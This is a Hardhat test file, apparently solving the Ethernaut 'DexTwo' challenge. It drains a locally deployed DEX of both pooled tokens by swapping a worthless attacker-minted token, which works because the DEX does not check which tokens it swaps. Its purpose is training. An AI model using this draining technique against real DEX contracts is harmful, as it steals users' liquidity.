import { TransactionResponse } from "@ethersproject/providers";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { Contract } from "ethers";
import { ethers } from "hardhat";

const CONTRACT_NAME = "DexTwo";

describe(CONTRACT_NAME, () => {
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;
  let contract: Contract;
  let token1: Contract;
  let token2: Contract;
  let tx: TransactionResponse;

  beforeEach(async () => {
    [owner, attacker] = await ethers.getSigners();

    const factory = await ethers.getContractFactory(CONTRACT_NAME);
    contract = await factory.deploy();
    await contract.deployed();

    const token1Factory = await ethers.getContractFactory("SwappableTokenTwo");
    token1 = await token1Factory.deploy(contract.address, "Token 1", "TKN1", 110);
    await token1.deployed();

    const token2Factory = await ethers.getContractFactory("SwappableTokenTwo");
    token2 = await token2Factory.deploy(contract.address, "Token 2", "TKN2", 110);
    await token2.deployed();

    tx = await contract.setTokens(token1.address, token2.address);
    await tx.wait();

    tx = await token1["approve(address,address,uint256)"](owner.address, contract.address, 100);
    await tx.wait();

    tx = await token2["approve(address,address,uint256)"](owner.address, contract.address, 100);
    await tx.wait();

    tx = await contract.add_liquidity(token1.address, 100);
    await tx.wait();

    tx = await contract.add_liquidity(token2.address, 100);
    await tx.wait();

    tx = await token1.transfer(attacker.address, 10);
    await tx.wait();

    tx = await token2.transfer(attacker.address, 10);
    await tx.wait();

    contract = contract.connect(attacker);
  });

  it("Solves the challenge", async () => {
    tx = await contract.approve(contract.address, 100000);
    await tx.wait();

    const attackerTokenFactory = await ethers.getContractFactory("SwappableTokenTwo");
    const attackerToken = await attackerTokenFactory
      .connect(attacker)
      .deploy(contract.address, "Attack on Token", "AOT", 100000);
    await attackerToken.deployed();

    tx = await attackerToken["approve(address,address,uint256)"](attacker.address, contract.address, 100000);
    await tx.wait();

    tx = await attackerToken.transfer(contract.address, 1);
    await tx.wait();

    tx = await contract.swap(attackerToken.address, token1.address, 1);
    await tx.wait();

    tx = await attackerToken.transfer(contract.address, 8);
    await tx.wait();

    tx = await contract.swap(attackerToken.address, token2.address, 10);
    await tx.wait();

    expect(await token1.balanceOf(contract.address)).to.eq(0);
    expect(await token2.balanceOf(contract.address)).to.eq(0);
  });
});
